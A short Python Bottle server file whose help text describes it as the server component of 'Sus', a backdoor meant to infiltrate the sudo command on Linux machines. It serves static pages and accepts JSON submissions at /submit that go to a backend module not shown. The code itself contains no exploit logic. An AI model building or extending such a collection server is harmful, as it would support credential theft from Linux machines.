import bottle
import json
import sys
import backend

@bottle.route('')
def home():
    return bottle.static_file('home.html',root='static')

@bottle.route('/<page>')
def static(page):
    return bottle.static_file(page,root='static')

@bottle.route('/')
def redir():
    bottle.redirect('/home')

@bottle.post('/submit')
def dataupdate():
    tmp = json.loads(bottle.request.body.read().decode())
    return backend.update(tmp)

if "--h" in sys.argv:
    out = """Sus is a backdoor system meant to infiltrate the "sudo" command on linux machines. This file is the server file. 
    If anyone else is actually trying to use this just email me: seanmanl@buffalo.edu
    Anyway commands:
        --h > Display help
        --c > Clear database"""
    print(out)
    sys.exit()
if "--c" in sys.argv:
    backend.clear_db()


bottle.run(host='127.0.0.1',port=3000,debug=True)